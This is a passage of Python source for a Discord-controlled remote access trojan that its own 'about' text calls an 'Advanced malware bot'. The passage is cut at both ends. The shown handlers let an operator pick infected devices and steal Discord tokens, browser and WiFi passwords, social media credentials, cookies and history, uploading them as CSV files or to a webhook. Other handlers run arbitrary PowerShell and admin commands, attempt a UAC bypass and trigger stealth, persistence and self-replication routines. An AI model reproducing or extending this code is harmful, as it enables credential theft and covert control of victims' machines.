            discord.SelectOption(label="Other Commands", value="other_commands", description="Miscellaneous commands")
        ]
        super().__init__(placeholder="Choose a command category...", min_values=1, max_values=1, options=options)
    
    async def callback(self, interaction: discord.Interaction):
        category = self.values[0]
        
        if category == "user_commands":
            help_text = """
User Management Commands:

• `$users` - Show all registered users
• `$userinfo [user_id]` - Get detailed info about a user
• `$select <user_id>` - Select which user to control
• `$current` - Show current selected user
• `$remove <user_id>` - Remove user from registry
"""
        
        elif category == "system_commands":
            help_text = """
System Commands:

• `$status` - Check PC status (internet, uptime, CPU, memory, disk)
• `$screenshot [number]` - Capture screenshot(s)
• `$live` - Start live screenshot mode (every 10 seconds)
• `$stop` - Stop screenshot capture or live mode
• `$countdown <seconds>` - Start countdown timer
• `$countstop` - Stop countdown timer
• `$location` - Get device location
• `$info` - Get detailed system information
"""
        
        elif category == "power_commands":
            help_text = """
Power Control Commands:

• `$shutdown [delay]` - Shutdown PC (default: 60s)
• `$shutdown now` - Shutdown immediately
• `$shutdown 30` - Shutdown in 30 seconds
• `$restart [delay]` - Restart PC
• `$restart now` - Restart immediately
• `$cancel` - Cancel pending shutdown/restart
• `$shutdownstatus` - Check shutdown/restart status
"""
        
        elif category == "file_commands":
            help_text = """
File System Commands:

• `$ls [path]` - List files in directory
• `$cd <path>` - Change directory
• `$pwd` - Show current directory
• `$download <filename>` - Download a specific file
• `$downloadall` - Download ALL files from current directory
• `$search <pattern>` - Search for files by name
• `$info <filename>` - Get file information
• `$cmd <command>` - Execute system command
"""
        
        elif category == "token_commands":
            help_text = """
Token Stealing Commands:

• `$tokens` - Steal ALL Discord tokens from all browsers
• `$tokens chrome` - Steal Chrome Discord tokens only
• `$tokens edge` - Steal Microsoft Edge Discord tokens only
• `$tokens old` - Steal tokens with OLD UI format (webhook)
• `$tokens all` - Steal from all browsers (same as $tokens)
"""
        
        elif category == "password_commands":
            help_text = """
Password Stealing Commands:

• `$passwords` - Steal ALL passwords (browsers, WiFi, etc.)
• `$passwords chrome` - Steal Chrome passwords only
• `$passwords edge` - Steal Microsoft Edge passwords only
• `$passwords wifi` - Steal WiFi passwords only
• `$passwords social` - Steal social media passwords only
• `$passwords all` - Steal all credentials
"""
        
        elif category == "social_commands":
            help_text = """
Social Media Commands:

• `$social` - Steal ALL social media credentials
• `$social youtube` - Steal YouTube credentials
• `$social instagram` - Steal Instagram credentials
• `$social telegram` - Steal Telegram credentials
• `$social facebook` - Steal Facebook credentials
• `$social twitter` - Steal Twitter credentials
• `$social cookies` - Steal social media cookies
• `$social all` - Steal all social media data
"""
        
        elif category == "browser_commands":
            help_text = """
Browser Data Commands:

• `$br_history` - Get default browser history
• `$br_history chrome` - Get Chrome browser history
• `$br_history edge` - Get Microsoft Edge browser history
• `$cookies` - Get browser cookies
• `$cookies social` - Get social media cookies only
"""
        
        elif category == "admin_commands":
            help_text = """
Admin & PowerShell Commands:

• `$pwrshell <command>` - Run PowerShell command (with admin if available)
• `$admin <command>` - Execute command with admin privileges
• `$uacbypass <command>` - Bypass UAC to run command
• `$adminstatus` - Check if running with admin privileges
• `$elevate` - Try to restart with admin privileges
"""
        
        elif category == "other_commands":
            help_text = """
Other Commands:

• `$help` - Show this help menu
• `$cleanup` - Clean up temporary files
• `$audio <text>` - Make PC speak text
• `$url <link>` - Open URL in browser
• `$url stealth <link>` - Open URL stealthily
• `$stealth` - Enhance stealth measures
• `$persistence` - Re-establish persistence
• `$replicate` - Create self-replicating payload
• `$ping` - Check bot latency
• `$about` - Show about information
"""
        
        embed = discord.Embed(
            title=f"{category.replace('_', ' ').title()}",
            description=help_text,
            color=0x7289DA
        )
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

class EnhancedHelpView(ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(EnhancedHelpDropdown())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print(f'Prefix: {COMMAND_PREFIX}')
    print('------')
    
    send_bot_started_notification()

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if not message.content.startswith(COMMAND_PREFIX):
        return
    
    current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
    if current_user:
        current_user['last_seen'] = datetime.datetime.now().isoformat()
        current_user['is_online'] = True
        user_system.save_users()
    
    await bot.process_commands(message)

@bot.command(name='help')
async def help_command(ctx):
    embed = discord.Embed(
        title="Enhanced Bot Help Menu",
        description="Select a category from the dropdown below to see available commands:",
        color=0x7289DA
    )
    
    embed.add_field(name="Quick Reference", 
                   value="• `$users` - List devices\n• `$status` - System status\n• `$tokens` - Discord tokens\n• `$social` - Social media\n• `$passwords` - All passwords\n• `$br_history` - Browser history\n• `$pwrshell` - PowerShell commands", 
                   inline=False)
    
    embed.set_footer(text=f"Bot User: {bot.user.name} | Total Devices: {len(user_system.registered_users)}")
    
    view = EnhancedHelpView()
    await ctx.send(embed=embed, view=view)

@bot.command(name='ping')
async def ping_command(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'Pong! `{latency}ms`')

@bot.command(name='users')
async def users_command(ctx):
    if not user_system.registered_users:
        await ctx.send("No users registered yet.")
        return
    
    user_list = user_system.get_user_list()
    current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
    
    embed = discord.Embed(
        title="Registered Devices",
        description=f"Total Devices: {len(user_system.registered_users)}\n\n{user_list}",
        color=0x7289DA
    )
    
    if current_user:
        embed.add_field(name="Currently Controlling", 
                       value=f"{current_user['display_name']}\n`{current_user['id']}`", 
                       inline=False)
    
    embed.set_footer(text="Use $select <id> to control a specific device")
    await ctx.send(embed=embed)

@bot.command(name='select')
async def select_command(ctx, user_id: str = None):
    if not user_id:
        embed = discord.Embed(
            title="Available Devices",
            description="Usage: `$select <device_id>`\n\nAvailable Devices:",
            color=0x7289DA
        )
        
        for user in user_system.registered_users[:10]:
            embed.add_field(
                name=f"{'👑 ' if user['selected'] else ''}{user['display_name']}",
                value=f"`{user['id']}` | {user['location'].get('city', 'Unknown')}\nLast: {datetime.datetime.fromisoformat(user['last_seen']).strftime('%H:%M') if 'last_seen' in user else 'Unknown'}",
                inline=False
            )
        
        await ctx.send(embed=embed)
        return
    
    user = user_system.select_user(user_id.upper())
    
    if not user:
        await ctx.send(f"❌ Device not found: `{user_id}`")
        return
    
    embed = discord.Embed(
        title="✅ Device Selected",
        description=f"Now controlling {user['display_name']}",
        color=0x00ff00
    )
    
    embed.add_field(name="Device ID", value=f"`{user['id']}`", inline=True)
    embed.add_field(name="PC Name", value=f"`{user['pc_name']}`", inline=True)
    embed.add_field(name="Username", value=f"`{user['username']}`", inline=True)
    embed.add_field(name="SID", value=f"`{user['system_info']['user_sid']}`", inline=True)
    embed.add_field(name="Private IP", value=f"`{get_private_ip()}`", inline=True)
    embed.add_field(name="Location", value=f"{user['location'].get('city', 'Unknown')}, {user['location'].get('country', 'Unknown')}", inline=True)
    embed.add_field(name="Public IP", value=f"`{user['location'].get('ip', 'Unknown')}`", inline=True)
    embed.add_field(name="Total Logins", value=f"`{user.get('login_count', 1)}`", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='current')
async def current_command(ctx):
    current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
    
    if not current_user:
        await ctx.send("No device is currently selected.\nUse `$select <device_id>` to select a device.")
        return
    
    location = current_user['location']
    maps_link = ""
    if 'lat' in location and 'lon' in location and location['lat'] != 0:
        maps_link = f"\nGoogle Maps: https://www.google.com/maps?q={location['lat']},{location['lon']}"
    
    embed = discord.Embed(
        title=f"Currently Controlling - {current_user['display_name']}",
        description=f"Device ID: `{current_user['id']}`\nFirst Seen: <t:{int(datetime.datetime.fromisoformat(current_user['first_seen']).timestamp())}:R>\nLast Seen: <t:{int(datetime.datetime.fromisoformat(current_user['last_seen']).timestamp())}:R>",
        color=0x00ff00
    )
    
    sys_info = current_user['system_info']
    embed.add_field(
        name="System Information",
        value=f"PC Name: `{sys_info['pc_name']}`\nUsername: `{sys_info['username']}`\nSID: `{sys_info['user_sid']}`\nPrivate IP: `{get_private_ip()}`\nPublic IP: `{location.get('ip', 'Unknown')}`\nOS: `{sys_info['os']}`\nArch: `{sys_info['processor_arch']}`",
        inline=False
    )
    
    loc_info = f"City: {location.get('city', 'Unknown')}\n"
    if 'region' in location:
        loc_info += f"Region: {location['region']}\n"
    if 'country' in location:
        loc_info += f"Country: {location['country']}\n"
    if 'lat' in location:
        loc_info += f"Coordinates: {location['lat']:.6f}, {location['lon']:.6f}"
    
    embed.add_field(name="Location Information", value=loc_info + maps_link, inline=False)
    
    embed.add_field(name="Status", 
                   value=f"Online\nSelected\nTotal Logins: {current_user.get('login_count', 1)}\nTokens Found: {current_user.get('tokens_found', 0)}\nPasswords Found: {current_user.get('passwords_found', 0)}", 
                   inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='remove')
async def remove_command(ctx, user_id: str = None):
    if not user_id:
        await ctx.send("Usage: `$remove <user_id>`")
        return
    
    user_id = user_id.upper()
    removed_user = None
    
    for i, user in enumerate(user_system.registered_users):
        if user['id'] == user_id:
            removed_user = user_system.registered_users.pop(i)
            break
    
    if removed_user:
        user_system.save_users()
        await ctx.send(f"User {removed_user['display_name']} (`{user_id}`) has been removed from the registry.")
        
        if user_system.current_user_id == user_id:
            user_system.current_user_id = None
            await ctx.send("Note: Current user selection has been cleared.")
    else:
        await ctx.send(f"❌ User not found: `{user_id}`")

@bot.command(name='status')
async def status_command(ctx):
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('C:\\')
        
        net_io = psutil.net_io_counters()
        bytes_sent_mb = net_io.bytes_sent / (1024**2)
        bytes_recv_mb = net_io.bytes_recv / (1024**2)
        
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        uptime_str = str(datetime.timedelta(seconds=int(uptime_seconds)))
        
        internet_status = "Connected" if check_internet_connection() else "Disconnected"
        
        embed = discord.Embed(
            title="System Status Report",
            color=0x00ff00,
            timestamp=datetime.datetime.now(datetime.timezone.utc)
        )
        
        embed.add_field(name="Internet Status", value=internet_status, inline=True)
        embed.add_field(name="System Uptime", value=f"{uptime_str}", inline=True)
        embed.add_field(name="CPU Usage", value=f"{cpu_usage:.1f}%", inline=True)
        embed.add_field(name="Memory Usage", value=f"{memory.percent:.1f}% ({memory.used//(1024**3)}GB/{memory.total//(1024**3)}GB)", inline=True)
        embed.add_field(name="Disk Usage (C:)", value=f"{disk.percent:.1f}% ({disk.used//(1024**3)}GB/{disk.total//(1024**3)}GB)", inline=True)
        embed.add_field(name="Network Activity", value=f"Sent: {bytes_sent_mb:.1f}MB\nRecv: {bytes_recv_mb:.1f}MB", inline=True)
        
        current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
        if current_user:
            embed.add_field(name="Current User", value=f"`{current_user['display_name']}`", inline=True)
            embed.add_field(name="PC Name", value=f"`{current_user['pc_name']}`", inline=True)
            embed.add_field(name="SID", value=f"`{current_user['system_info']['user_sid'][:20]}...`", inline=True)
            embed.add_field(name="Private IP", value=f"`{get_private_ip()}`", inline=True)
            embed.add_field(name="Public IP", value=f"`{current_user['location'].get('ip', 'Unknown')}`", inline=True)
            embed.add_field(name="Location", value=f"{current_user['location'].get('city', 'Unknown')}, {current_user['location'].get('country', 'Unknown')}", inline=True)
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error getting status: {str(e)}")

@bot.command(name='about')
async def about_command(ctx, subcommand: str = None):
    if subcommand == "pc_info":
        current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
        if current_user:
            sys_info = current_user['system_info']
            embed = discord.Embed(
                title="PC Information",
                color=0x7289DA,
                timestamp=datetime.datetime.now(datetime.timezone.utc)
            )
            
            embed.add_field(name="PC Name", value=f"`{sys_info['pc_name']}`", inline=True)
            embed.add_field(name="Username", value=f"`{sys_info['username']}`", inline=True)
            embed.add_field(name="Windows User", value=f"`{sys_info['windows_user']}`", inline=True)
            embed.add_field(name="Windows Domain", value=f"`{sys_info['windows_domain']}`", inline=True)
            embed.add_field(name="User SID", value=f"`{sys_info['user_sid']}`", inline=True)
            embed.add_field(name="Private IP", value=f"`{get_private_ip()}`", inline=True)
            embed.add_field(name="OS", value=f"`{sys_info['os']}`", inline=True)
            embed.add_field(name="Processor Arch", value=f"`{sys_info['processor_arch']}`", inline=True)
            embed.add_field(name="Profile Path", value=f"`{sys_info['windows_profile'][:50]}...`", inline=True)
            
            await ctx.send(embed=embed)
        else:
            await ctx.send("No device selected.")
    
    elif subcommand == "bot_info":
        embed = discord.Embed(
            title="Bot Information",
            description="This bot is made by developer Prakash by himself.",
            color=0x7289DA,
            timestamp=datetime.datetime.now(datetime.timezone.utc)
        )
        
        embed.add_field(name="Developer", value="Prakash", inline=True)
        embed.add_field(name="Instagram", value="https://www.instagram.com/prakash_77776/", inline=True)
        embed.add_field(name="Discord", value="_nomorefixaa", inline=True)
        embed.add_field(name="Helpers", value="awaraX, BerlinX, and Zenitsu", inline=True)
        embed.add_field(name="Version", value="1.0.0", inline=True)
        embed.add_field(name="Features", value="Advanced malware bot with all features", inline=True)
        
        await ctx.send(embed=embed)
    
    else:
        embed = discord.Embed(
            title="About",
            description="Use `$about pc_info` for PC details or `$about bot_info` for bot information.",
            color=0x7289DA
        )
        await ctx.send(embed=embed)

@bot.command(name='tokens')
async def tokens_command(ctx, mode: str = "all"):
    await ctx.send("Searching for Discord tokens...")
    
    async with ctx.typing():
        if mode.lower() == "old":
            tokens = steal_discord_tokens_with_ui()
            send_token_notification(tokens)
            await ctx.send("✅ Tokens extracted and sent to webhook!")
            return
        
        # Use the working function for all modes
        tokens = steal_discord_tokens_with_ui()
        send_token_notification(tokens)
    
    # Bot will NOT send any response - only webhook sends the tokens
    await ctx.send("✅ Token extraction completed. Check webhook for results.")

@bot.command(name='passwords')
async def passwords_command(ctx, category: str = "all"):
    await ctx.send(f"Starting password extraction...")
    
    async with ctx.typing():
        if category.lower() == "social":
            all_passwords = steal_all_passwords()
            passwords = filter_social_media_credentials(all_passwords)
            title = "Social Media Passwords"
        elif category.lower() == "chrome":
            passwords = get_chrome_passwords()
            title = "Chrome Passwords"
        elif category.lower() == "edge":
            passwords = get_edge_passwords()
            title = "Microsoft Edge Passwords"
        elif category.lower() == "wifi":
            passwords = get_wifi_passwords()
            title = "WiFi Passwords"
        else:
            passwords = steal_all_passwords()
            title = "All Passwords"
    
    if not passwords:
        await ctx.send(f"No passwords found.")
        return
    
    browser_passwords = [p for p in passwords if p.get('type') == 'Browser Password']
    wifi_passwords = [p for p in passwords if p.get('type') == 'WiFi']
    social_passwords = filter_social_media_credentials(passwords)
    
    embed = discord.Embed(
        title=title,
        description=f"Successfully extracted {len(passwords)} credential(s)!",
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    embed.add_field(name="Statistics", 
                   value=f"Browser Passwords: {len(browser_passwords)}\nWiFi Networks: {len(wifi_passwords)}\nSocial Media: {len(social_passwords)}", 
                   inline=True)
    
    sample_text = []
    for cred in passwords[:5]:
        if cred.get('type') == 'WiFi':
            sample_text.append(f"WiFi: `{cred['ssid']}` : `{cred['password']}`")
        elif cred.get('is_social'):
            sample_text.append(f"{cred['domain']}: `{cred['username']}` : `{cred['password']}`")
        else:
            sample_text.append(f"{cred['browser']} - {cred['domain']}: `{cred['username']}`")
    
    if sample_text:
        embed.add_field(name="Sample Credentials", value="\n".join(sample_text), inline=False)
    
    csv_content = create_password_csv(passwords, "passwords")
    
    if csv_content:
        temp_file = os.path.join(tempfile.gettempdir(), f"passwords_{int(time.time())}.csv")
        with open(temp_file, 'w', encoding='utf-8', newline='') as f:
            f.write(csv_content)
        
        with open(temp_file, 'rb') as f:
            await ctx.send(
                embed=embed,
                file=File(f, filename="stolen_passwords.csv")
            )
        
        os.remove(temp_file)
    else:
        await ctx.send(embed=embed)

@bot.command(name='social')
async def social_command(ctx, platform: str = "all"):
    await ctx.send(f"Extracting social media credentials...")
    
    async with ctx.typing():
        all_passwords = steal_all_passwords()
        social_passwords = filter_social_media_credentials(all_passwords)
        social_cookies = get_social_media_cookies()
    
    if not social_passwords and not social_cookies:
        await ctx.send("No social media credentials found.")
        return
    
    embed = discord.Embed(
        title="Social Media Credentials",
        description="Social media data extracted successfully!",
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    embed.add_field(name="Statistics", 
                   value=f"Passwords: {len(social_passwords)}\nCookies: {len(social_cookies)}", 
                   inline=True)
    
    platforms = {}
    for cred in social_passwords:
        domain = cred.get('domain', 'Unknown')
        for social_domain in SOCIAL_MEDIA_DOMAINS:
            if social_domain in domain.lower():
                platform_name = social_domain.split('.')[0].title()
                if platform_name not in platforms:
                    platforms[platform_name] = []
                platforms[platform_name].append(cred)
                break
    
    for platform_name, creds in list(platforms.items())[:5]:
        sample = creds[0]
        embed.add_field(
            name=f"{platform_name}",
            value=f"Credentials: {len(creds)}\nSample: `{sample['username']}` @ {sample['domain']}",
            inline=True
        )
    
    all_data = []
    for cred in social_passwords:
        all_data.append({
            'Type': 'Password',
            'Platform': cred.get('domain', 'Unknown'),
            'Username': cred.get('username', 'N/A'),
            'Password': cred.get('password', 'N/A'),
            'Browser': cred.get('browser', 'N/A'),
            'Date': cred.get('date', 'N/A')
        })
    
    for cookie in social_cookies[:100]:
        all_data.append({
            'Type': 'Cookie',
            'Platform': cookie.get('domain', 'Unknown'),
            'Name': cookie.get('name', 'N/A'),
            'Value': cookie.get('value', 'N/A')[:100] + '...' if len(cookie.get('value', '')) > 100 else cookie.get('value', 'N/A'),
            'Browser': cookie.get('browser', 'N/A'),
            'Expires': cookie.get('expires', 'N/A')
        })
    
    if all_data:
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['Type', 'Platform', 'Username/Name', 'Password/Value', 'Browser', 'Date/Expires'])
        
        for item in all_data:
            writer.writerow([
                item['Type'],
                item['Platform'],
                item.get('Username', item.get('Name', 'N/A')),
                item.get('Password', item.get('Value', 'N/A')),
                item['Browser'],
                item.get('Date', item.get('Expires', 'N/A'))
            ])
        
        csv_content = output.getvalue()
        output.close()
        
        temp_file = os.path.join(tempfile.gettempdir(), f"social_{int(time.time())}.csv")
        with open(temp_file, 'w', encoding='utf-8', newline='') as f:
            f.write(csv_content)
        
        with open(temp_file, 'rb') as f:
            await ctx.send(
                embed=embed,
                file=File(f, filename="social_media_credentials.csv")
            )
        
        os.remove(temp_file)
    else:
        await ctx.send(embed=embed)

@bot.command(name='wifi')
async def wifi_command(ctx):
    await ctx.send("Extracting WiFi passwords...")
    
    async with ctx.typing():
        wifi_passwords = get_wifi_passwords()
    
    if not wifi_passwords:
        await ctx.send("No WiFi passwords found.")
        return
    
    embed = discord.Embed(
        title="WiFi Passwords",
        description=f"Found {len(wifi_passwords)} WiFi network(s)!",
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    for i, wifi in enumerate(wifi_passwords[:15]):
        embed.add_field(
            name=f"{wifi['ssid']}",
            value=f"Password: `{wifi['password']}`\nType: {wifi['type']}",
            inline=True
        )
    
    if len(wifi_passwords) > 15:
        embed.add_field(
            name="Additional Networks",
            value=f"...and {len(wifi_passwords) - 15} more networks found.",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='credentials')
async def credentials_command(ctx):
    await ctx.send("Collecting all credentials...")
    
    async with ctx.typing():
        tokens = steal_discord_tokens()
        passwords = steal_all_passwords()
    
    if not tokens and not passwords:
        await ctx.send("No credentials found.")
        return
    
    total_credentials = len(tokens) + len(passwords)
    
    embed = discord.Embed(
        title="All Credentials Summary",
        description=f"Total credentials found: {total_credentials}",
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    stats = []
    if tokens:
        stats.append(f"Discord Tokens: {len(tokens)}")
    if passwords:
        wifi_count = len([p for p in passwords if p.get('type') == 'WiFi'])
        if wifi_count:
            stats.append(f"WiFi Networks: {wifi_count}")
    
    embed.add_field(name="Statistics", value="\n".join(stats), inline=False)
    
    embed.set_footer(text=f"Device: {user_data['display_name']}")
    await ctx.send(embed=embed)

@bot.command(name='cookies')
async def cookies_command(ctx, mode: str = "all"):
    await ctx.send(f"Extracting browser cookies...")
    
    async with ctx.typing():
        if mode.lower() == "social":
            cookies = get_social_media_cookies()
            title = "Social Media Cookies"
        else:
            cookies = []
            for browser_name, path in PATHS.items():
                if "Chrome" in browser_name:
                    cookie_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\Cookies"
                    key_path = LOCAL + "\\Google\\Chrome\\User Data\\Local State"
                    if os.path.exists(cookie_path):
                        cookies.extend(get_browser_cookies("Chrome", cookie_path, key_path))
                elif "Edge" in browser_name:
                    cookie_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Cookies"
                    key_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Local State"
                    if os.path.exists(cookie_path):
                        cookies.extend(get_browser_cookies("Microsoft Edge", cookie_path, key_path))
            
            title = "Browser Cookies"
    
    if not cookies:
        await ctx.send("No cookies found.")
        return
    
    embed = discord.Embed(
        title=title,
        description=f"Successfully extracted {len(cookies)} cookie(s)!",
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    embed.add_field(name="Statistics", 
                   value=f"Total Cookies: {len(cookies)}\nSocial Media Cookies: {len([c for c in cookies if c['is_social']])}", 
                   inline=True)
    
    sample_cookies = []
    for cookie in cookies[:5]:
        sample_cookies.append(f"{cookie['domain']} - `{cookie['name']}` = `{cookie['value'][:50]}...`")
    
    if sample_cookies:
        embed.add_field(name="Sample Cookies", value="\n".join(sample_cookies), inline=False)
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Browser', 'Domain', 'Name', 'Value', 'Path', 'Expires', 'Social Media'])
    
    for cookie in cookies[:1000]:
        writer.writerow([
            cookie['browser'],
            cookie['domain'],
            cookie['name'],
            cookie['value'],
            cookie['path'],
            cookie['expires'],
            'Yes' if cookie['is_social'] else 'No'
        ])
    
    csv_content = output.getvalue()
    output.close()
    
    temp_file = os.path.join(tempfile.gettempdir(), f"cookies_{int(time.time())}.csv")
    with open(temp_file, 'w', encoding='utf-8', newline='') as f:
        f.write(csv_content)
    
    with open(temp_file, 'rb') as f:
        await ctx.send(
            embed=embed,
            file=File(f, filename="browser_cookies.csv")
        )
    
    os.remove(temp_file)

@bot.command(name='br_history', aliases=['browser_history'])
async def br_history_command(ctx, browser: str = "default"):
    await ctx.send(f"Extracting browser history...")
    
    async with ctx.typing():
        if browser.lower() == "chrome":
            history_entries, browser_name = get_chrome_history(), "Chrome"
        elif browser.lower() == "edge":
            history_entries, browser_name = get_edge_history(), "Microsoft Edge"
        else:
            history_entries, browser_name = get_default_browser_history()
    
    if not history_entries:
        await ctx.send(f"No browser history found. ({browser_name})")
        return
    
    embed = discord.Embed(
        title=f"Browser History - {browser_name}",
        description=f"Successfully extracted {len(history_entries)} history entries!",
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    embed.add_field(name="Statistics", 
                   value=f"Browser: {browser_name}\nEntries Found: {len(history_entries)}\nDate Range: {history_entries[-1]['last_visit']} to {history_entries[0]['last_visit']}", 
                   inline=False)
    
    sample_text = []
    for entry in history_entries[:5]:
        sample_text.append(f"• {entry['title']}\n  `{entry['url'][:80]}...`\n  Visits: {entry['visit_count']} | Last: {entry['last_visit']}")
    
    if sample_text:
        embed.add_field(name="Sample Entries", value="\n\n".join(sample_text), inline=False)
    
    csv_content = create_history_csv(history_entries)
    
    if csv_content:
        temp_file = os.path.join(tempfile.gettempdir(), f"history_{int(time.time())}.csv")
        with open(temp_file, 'w', encoding='utf-8', newline='') as f:
            f.write(csv_content)
        
        with open(temp_file, 'rb') as f:
            await ctx.send(
                embed=embed,
                file=File(f, filename="browser_history.csv")
            )
        
        os.remove(temp_file)
    else:
        await ctx.send(embed=embed)

@bot.command(name='pwrshell')
async def pwrshell_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$pwrshell <powershell_command>`\n\nExamples:\n• `$pwrshell Get-Process`\n• `$pwrshell Get-Service`\n• `$pwrshell ipconfig`")
        return
    
    ps_command = ' '.join(args)
    
    if len(ps_command) > 500:
        await ctx.send("❌ Command too long! Maximum 500 characters.")
        return
    
    await ctx.send(f"Executing PowerShell command:\n```powershell\n{ps_command[:100]}{'...' if len(ps_command) > 100 else ''}\n```")
    
    async with ctx.typing():
        admin_status = "Admin: " + ("Yes" if is_admin() else "No (some commands may fail)")
        
        result = run_powershell_as_admin(ps_command)
    
    await ctx.send(admin_status)
    
    if len(result) > 1900:
        parts = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for i, part in enumerate(parts[:3]):
            await ctx.send(f"Output Part {i+1}:\n{part}")
        if len(parts) > 3:
            await ctx.send(f"Output truncated. Showing first 3 of {len(parts)} parts.")
    else:
        await ctx.send(result)

@bot.command(name='admin')
async def admin_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$admin <command>`\n\nExample: `$admin net user`")
        return
    
    cmd = ' '.join(args)
    
    if len(cmd) > 500:
        await ctx.send("❌ Command too long! Maximum 500 characters.")
        return
    
    await ctx.send(f"Executing command with admin privileges:\n```bash\n{cmd[:100]}{'...' if len(cmd) > 100 else ''}\n```")
    
    async with ctx.typing():
        result = execute_admin_command(cmd)
    
    if len(result) > 1900:
        parts = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for i, part in enumerate(parts[:3]):
            await ctx.send(f"Output Part {i+1}:\n{part}")
        if len(parts) > 3:
            await ctx.send(f"Output truncated. Showing first 3 of {len(parts)} parts.")
    else:
        await ctx.send(result)

@bot.command(name='uacbypass')
async def uacbypass_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$uacbypass <command>`\n\nExample: `$uacbypass reg add`")
        return
    
    cmd = ' '.join(args)
    
    if len(cmd) > 500:
        await ctx.send("❌ Command too long! Maximum 500 characters.")
        return
    
    await ctx.send(f"Attempting UAC bypass for command:\n```bash\n{cmd[:100]}{'...' if len(cmd) > 100 else ''}\n```")
    
    async with ctx.typing():
        result = bypass_uac(cmd)
    
    await ctx.send(result)

@bot.command(name='adminstatus')
async def adminstatus_command(ctx):
    if is_admin():
        await ctx.send("Running with ADMIN privileges!")
    else:
        await ctx.send("Running WITHOUT admin privileges.\nSome features may be limited.")
        await ctx.send("Try: `$elevate` to attempt gaining admin privileges.")

@bot.command(name='elevate')
async def elevate_command(ctx):
    await ctx.send("Attempting to gain admin privileges...")
    
    if is_admin():
        await ctx.send("Already running with admin privileges!")
        return
    
    if run_as_admin():
        await ctx.send("Restarting with admin privileges...\nBot will reconnect automatically.")
    else:
        await ctx.send("Failed to gain admin privileges.\nUser may have denied UAC prompt.")

@bot.command(name='stealth')
async def stealth_command(ctx):
    await ctx.send("Applying enhanced stealth measures...")
    
    try:
        enhance_stealth()
        await ctx.send("Stealth measures applied successfully!")
    except Exception as e:
        await ctx.send(f"❌ Error applying stealth measures: {str(e)}")

@bot.command(name='persistence')
async def persistence_command(ctx):
    await ctx.send("Re-establishing persistence...")
    
    try:
        success, methods = add_to_startup_advanced()
        if success:
            await ctx.send(f"Persistence re-established successfully! ({', '.join(methods)})")
        else:
            await ctx.send("Persistence re-establishment failed.")
    except Exception as e:
        await ctx.send(f"❌ Error re-establishing persistence: {str(e)}")

@bot.command(name='replicate')
async def replicate_command(ctx):
    await ctx.send("Creating self-replicating payload...")
    
    try:
        create_self_replicating_payload()
        await ctx.send("Self-replicating payload created successfully!")
    except Exception as e:
        await ctx.send(f"❌ Error creating payload: {str(e)}")

@bot.command(name='ls', aliases=['dir'])
async def ls_command(ctx, *args):
    path = ' '.join(args) if args else os.getcwd()
    
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    
    listing = list_directory(path)
    await ctx.send(listing)

@bot.command(name='cd')
async def cd_command(ctx, *args):
    if not args:
        await ctx.send(f"Current Directory: `{os.getcwd()}`")
        return
    
    target = ' '.join(args)
    
    if target == "..":
        new_path = os.path.dirname(os.getcwd())
    else:
        if not os.path.isabs(target):
            target = os.path.join(os.getcwd(), target)
        new_path = target
    
    try:
        os.chdir(new_path)
        await ctx.send(f"Changed directory to: `{os.getcwd()}`")
    except Exception as e:
        await ctx.send(f"❌ Cannot change directory: `{str(e)}`")

@bot.command(name='pwd')
async def pwd_command(ctx):
    await ctx.send(f"Current Directory: `{os.getcwd()}`")

@bot.command(name='download')
async def download_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$download <filename>`")
        return
    
    filename = ' '.join(args)
    if not os.path.isabs(filename):
        filename = os.path.join(os.getcwd(), filename)
    
    await download_and_send_file(ctx, filename)

@bot.command(name='downloadall')
async def downloadall_command(ctx, *args):
    path = ' '.join(args) if args else os.getcwd()
    
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    
    await downloadall_files(ctx, path)

@bot.command(name='search')
async def search_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$search <pattern>`")
        return
    
    pattern = args[0]
    result = search_files(os.getcwd(), pattern)
    await ctx.send(result)

@bot.command(name='info')
async def info_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$info <filename>`")
        return
    
    filename = ' '.join(args)
    if not os.path.isabs(filename):
        filename = os.path.join(os.getcwd(), filename)
    
    info = get_file_info(filename)
    await ctx.send(info)

@bot.command(name='cmd', aliases=['exec'])
async def cmd_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$cmd <command>`")
        return
    
    cmd = ' '.join(args)
